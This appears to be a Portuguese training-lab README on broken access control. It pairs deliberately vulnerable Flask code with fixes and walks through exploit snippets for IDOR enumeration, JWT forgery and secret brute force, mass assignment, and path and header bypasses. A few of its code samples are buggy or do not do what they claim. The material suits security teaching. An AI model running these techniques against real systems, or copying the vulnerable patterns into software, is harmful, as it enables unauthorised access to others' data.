# 🔐 Broken Access Control - Laboratório Guiado Completo

## 📋 Visão Geral

**Dificuldade**: 🟢 Iniciante → 🔴 Avançado
**Tempo estimado**: 5-7 horas
**Pontos**: 70 (10 + 25 + 35)

### O Que Você Vai Aprender

✅ Fundamentos de controle de acesso
✅ IDOR (Insecure Direct Object Reference)
✅ Privilege Escalation (horizontal e vertical)
✅ JWT manipulation e bypass
✅ Mass Assignment vulnerabilities
✅ Missing Function Level Access Control
✅ Path-based e parameter-based bypass

---

## 📖 Teoria Completa

### O Que É Broken Access Control?

Broken Access Control ocorre quando usuários conseguem realizar ações ou acessar dados além das suas permissões. É a vulnerabilidade #1 do OWASP Top 10 2021.

### Tipos de Problemas de Acesso

#### 1. Controle Vertical (Privilege Escalation)

**Características:**
- Usuário comum acessa funções administrativas
- Bypass de níveis de permissão
- Acesso a recursos de maior privilégio

**Exemplo:**
```python
# VULNERÁVEL ❌
@app.route('/admin/delete_user/<user_id>')
def delete_user(user_id):
    # Sem verificação de role!
    User.delete(user_id)
    return 'Deleted'
```

**Exploit:**
```
# Usuário comum acessa URL admin
GET /admin/delete_user/123
```

#### 2. Controle Horizontal (IDOR)

**Características:**
- Usuário acessa recursos de outro usuário do mesmo nível
- Modificação de IDs em URLs ou parâmetros
- Bypass através de referência direta

**Exemplo vulnerável:**
```python
# VULNERÁVEL ❌
@app.route('/profile/<user_id>')
def profile(user_id):
    # Mostra perfil sem verificar se é o dono!
    user = User.get(user_id)
    return render_template('profile.html', user=user)
```

**Exploit:**
```
# Alice (ID=1) acessa perfil de Bob (ID=2)
GET /profile/2
```

---

## 🎯 IDOR - Insecure Direct Object Reference

### Como Funciona

IDOR ocorre quando aplicação expõe referência direta a objetos (IDs) sem validar se o usuário tem permissão.

### Código Vulnerável Clássico

```python
# VULNERÁVEL ❌
@app.route('/api/orders/<order_id>')
def get_order(order_id):
    order = db.execute('SELECT * FROM orders WHERE id = ?', (order_id,))
    return jsonify(order)
```

**Problema:** Qualquer usuário pode acessar pedido de qualquer outro alterando `order_id`.

### Código Corrigido

```python
# CORRETO ✅
@app.route('/api/orders/<order_id>')
@login_required
def get_order(order_id):
    user_id = session['user_id']
    order = db.execute(
        'SELECT * FROM orders WHERE id = ? AND user_id = ?',
        (order_id, user_id)
    )
    if not order:
        return 'Access Denied', 403
    return jsonify(order)
```

### Locais Comuns de IDOR

```
URLs:
/user/profile?id=123
/document/download?doc_id=456
/api/v1/orders/789

Cookies:
user_id=123

Headers:
X-User-Id: 123

JSON Body:
{"user_id": 123, "action": "delete"}
```

---

## 🔑 JWT Manipulation

### O Que É JWT?

JSON Web Token - método de autenticação que codifica dados em formato JSON assinado.

**Estrutura:**
```
header.payload.signature

eyJhbGc... . eyJ1c2VyX2lk... . SflKxwRJ...
```

### Vulnerabilidades Comuns

#### 1. None Algorithm

```javascript
// Header modificado
{
  "alg": "none",  // ❌ Remove verificação de assinatura!
  "typ": "JWT"
}
```

**Exploit:**
```python
import base64
import json

header = {"alg": "none", "typ": "JWT"}
payload = {"user_id": 1, "role": "admin"}

token = base64.urlsafe_b64encode(json.dumps(header).encode()) + '.' + \
        base64.urlsafe_b64encode(json.dumps(payload).encode()) + '.'
```

#### 2. Weak Secret

```python
# VULNERÁVEL ❌
SECRET_KEY = 'secret'  # Facilmente quebrado por brute force!

# Ataque
import jwt
for secret in wordlist:
    try:
        jwt.decode(token, secret, algorithms=['HS256'])
        print(f'Secret found: {secret}')
        break
    except:
        continue
```

#### 3. Key Confusion (RS256 → HS256)

```python
# Servidor usa RS256 (chave pública + privada)
# Atacante força HS256 (chave simétrica)

# Se servidor aceitar HS256, pode assinar com chave pública!
token = jwt.encode(payload, public_key, algorithm='HS256')
```

---

## 🎭 Mass Assignment

### O Que É?

Vulnerabilidade onde aplicação permite modificar campos que não deveriam ser editáveis.

### Código Vulnerável

```python
# VULNERÁVEL ❌
@app.route('/api/profile', methods=['POST'])
def update_profile():
    user_id = session['user_id']
    user = User.get(user_id)

    # Atualiza TODOS os campos recebidos!
    for key, value in request.json.items():
        setattr(user, key, value)

    user.save()
    return 'Updated'
```

**Exploit:**
```javascript
// Usuário comum vira admin!
fetch('/api/profile', {
  method: 'POST',
  body: JSON.stringify({
    name: 'John',
    email: 'john@example.com',
    role: 'admin',        // ❌ Não deveria ser permitido!
    is_verified: true,    // ❌ Bypass de verificação
    balance: 999999       // ❌ Modifica saldo
  })
})
```

### Código Corrigido

```python
# CORRETO ✅
ALLOWED_FIELDS = ['name', 'email', 'bio', 'avatar']

@app.route('/api/profile', methods=['POST'])
def update_profile():
    user_id = session['user_id']
    user = User.get(user_id)

    # Atualiza apenas campos permitidos
    for key, value in request.json.items():
        if key in ALLOWED_FIELDS:
            setattr(user, key, value)

    user.save()
    return 'Updated'
```

---

## 🚀 Privilege Escalation Techniques

### 1. Parameter Tampering

```http
# Request original
POST /api/update_user
{"user_id": 123, "name": "John"}

# Modificado
POST /api/update_user
{"user_id": 123, "name": "John", "role": "admin"}
```

### 2. Path Bypass

```
# Bloqueado
/admin/panel

# Bypass
/admin/../admin/panel
/admin/./panel
/ADMIN/panel
/%61dmin/panel  (URL encoding)
```

### 3. HTTP Verb Tampering

```
# GET bloqueado para /admin
GET /admin -> 403 Forbidden

# POST pode estar permitido!
POST /admin -> 200 OK
```

### 4. Header Injection

```http
GET /api/users
X-Original-URL: /admin/users
X-Rewrite-URL: /admin/users
X-Forwarded-For: 127.0.0.1
```

### 5. Cookie/Session Manipulation

```javascript
// Cookie original
document.cookie = "role=user; user_id=123"

// Modificado
document.cookie = "role=admin; user_id=1"
```

---

## 🛠️ Técnicas de Bypass

### 1. Sequencial ID Enumeration

```python
# Descobrir IDs válidos
for i in range(1, 1000):
    response = requests.get(f'/api/user/{i}')
    if response.status_code == 200:
        print(f'Valid ID: {i}')
```

### 2. UUID Prediction

```python
# UUIDs v1 são previsíveis (baseados em timestamp)
import uuid

# Gerar UUIDs próximos
for i in range(100):
    predicted_uuid = uuid.uuid1()
    test_access(predicted_uuid)
```

### 3. JWT Decode & Modify

```python
import jwt

token = "eyJhbGc..."

# Decode sem verificar assinatura
payload = jwt.decode(token, options={"verify_signature": False})
print(payload)
# {'user_id': 123, 'role': 'user'}

# Modificar
payload['role'] = 'admin'

# Re-encode (requer conhecer o secret ou usar 'none')
new_token = jwt.encode(payload, 'secret_key', algorithm='HS256')
```

### 4. GraphQL Introspection

```graphql
# Descobrir queries administrativas
query {
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}

# Acessar dados não autorizados
query {
  adminUsers {
    id
    email
    password_hash
  }
}
```

---

## 📚 Payloads e Exemplos

### IDOR Testing

```bash
# Original request
GET /api/document/123

# Enumeração
for id in $(seq 1 1000); do
  curl -s "http://target/api/document/$id" | grep -q "sensitive"
  if [ $? -eq 0 ]; then
    echo "Found: $id"
  fi
done
```

### JWT Attacks

```python
# 1. None algorithm
header = '{"alg":"none","typ":"JWT"}'
payload = '{"user_id":1,"role":"admin"}'

import base64
token = base64.b64encode(header.encode()).decode().rstrip('=') + '.' + \
        base64.b64encode(payload.encode()).decode().rstrip('=') + '.'

# 2. Weak secret brute force
import jwt

wordlist = ['secret', 'password', '123456', 'admin']
for secret in wordlist:
    try:
        jwt.decode(token, secret, algorithms=['HS256'])
        print(f'Secret: {secret}')
        break
    except:
        continue
```

### Mass Assignment

```bash
# Descobrir campos aceitos
curl -X POST http://target/api/profile \
  -d '{"name":"test","role":"admin","is_admin":true,"balance":999999}'

# Iterar sobre campos comuns
fields = ['role', 'is_admin', 'admin', 'is_superuser', 'permissions',
          'verified', 'is_verified', 'balance', 'credits']

for field in fields:
    data = {field: True}
    response = requests.post('/api/profile', json=data)
    if 'success' in response.text:
        print(f'Vulnerable field: {field}')
```

---

## 🛡️ Prevenção

### 1. Implement Proper Authorization

```python
# CORRETO ✅
def check_access(user, resource):
    """Verifica se usuário tem acesso ao recurso"""
    if user.role == 'admin':
        return True

    if resource.owner_id == user.id:
        return True

    if user.id in resource.shared_with:
        return True

    return False

@app.route('/document/<doc_id>')
@login_required
def get_document(doc_id):
    user = get_current_user()
    document = Document.get(doc_id)

    if not check_access(user, document):
        return 'Access Denied', 403

    return document.content
```

### 2. Use Indirect References

```python
# CORRETO ✅ - Usar UUIDs não sequenciais
import uuid

# Ao criar recurso
resource_id = str(uuid.uuid4())  # '550e8400-e29b-41d4-a716-446655440000'

# Impossível enumerar!
```

### 3. Deny by Default

```python
# CORRETO ✅
def require_permission(permission):
    def decorator(f):
        @wraps(f)
        def wrapped(*args, **kwargs):
            if not current_user.has_permission(permission):
                return 'Access Denied', 403
            return f(*args, **kwargs)
        return wrapped
    return decorator

@app.route('/admin/users')
@require_permission('admin.users.view')
def admin_users():
    return render_template('admin/users.html')
```

### 4. Strong JWT Implementation

```python
# CORRETO ✅
import jwt
from datetime import datetime, timedelta

SECRET_KEY = os.environ['JWT_SECRET']  # Secreto, complexo, em variável de ambiente
ALGORITHM = 'HS256'  # Nunca 'none'!

def create_token(user):
    payload = {
        'user_id': user.id,
        'role': user.role,
        'exp': datetime.utcnow() + timedelta(hours=1),  # Expira em 1h
        'iat': datetime.utcnow()
    }
    return jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)

def verify_token(token):
    try:
        payload = jwt.decode(
            token,
            SECRET_KEY,
            algorithms=[ALGORITHM]  # Force algoritmo específico!
        )
        return payload
    except jwt.ExpiredSignatureError:
        return None
    except jwt.InvalidTokenError:
        return None
```

### 5. Whitelist Allowed Fields

```python
# CORRETO ✅
ALLOWED_UPDATE_FIELDS = {
    'user': ['name', 'email', 'bio', 'avatar'],
    'admin': ['name', 'email', 'bio', 'avatar', 'role', 'permissions']
}

@app.route('/api/profile', methods=['POST'])
@login_required
def update_profile():
    user = get_current_user()
    allowed_fields = ALLOWED_UPDATE_FIELDS.get(user.role, [])

    updates = {}
    for key, value in request.json.items():
        if key in allowed_fields:
            updates[key] = value
        else:
            return f'Field {key} not allowed', 400

    user.update(**updates)
    return 'Updated'
```

---

## 🎯 Estrutura do Laboratório

### 1. 🟢 Basic App (10 pontos)
- **Porta**: 5030
- **Cenário**: API REST simples
- IDOR em perfis de usuários
- Missing access control em endpoints admin
- Sem autenticação JWT

### 2. 🟡 Intermediate App (25 pontos)
- **Porta**: 5031
- **Cenário**: Sistema de arquivos
- JWT com secret fraco
- Mass assignment em atualização de perfil
- IDOR com UUID previsível
- Path-based bypass

### 3. 🔴 Advanced App (35 pontos)
- **Porta**: 5032
- **Cenário**: Plataforma bancária
- JWT RS256/HS256 confusion
- GraphQL com IDOR
- Rate limiting bypass
- Multi-step privilege escalation

---

## 📝 Checklist de Conclusão

- [ ] Entendi diferença entre controle vertical e horizontal
- [ ] Explorei IDOR em pelo menos 3 endpoints
- [ ] Escalei privilégio de user para admin
- [ ] Manipulei JWT para mudar role
- [ ] Explorei mass assignment
- [ ] Bypassei verificação de acesso com path manipulation
- [ ] Enumerati IDs sequenciais
- [ ] Quebrei JWT secret fraco
- [ ] Explorei GraphQL IDOR
- [ ] Completei todos os exercícios

**Total**: 70 pontos

---

## 🎓 Próximos Passos

Após dominar Broken Access Control:

1. **OAuth/OIDC Attacks**
2. **API Security Testing**
3. **GraphQL Security**
4. **Session Management Attacks**

**Próximo Lab**: [04 - SSRF →](../04-ssrf/README.md)

---

**Boa sorte e happy hacking! 🔐**
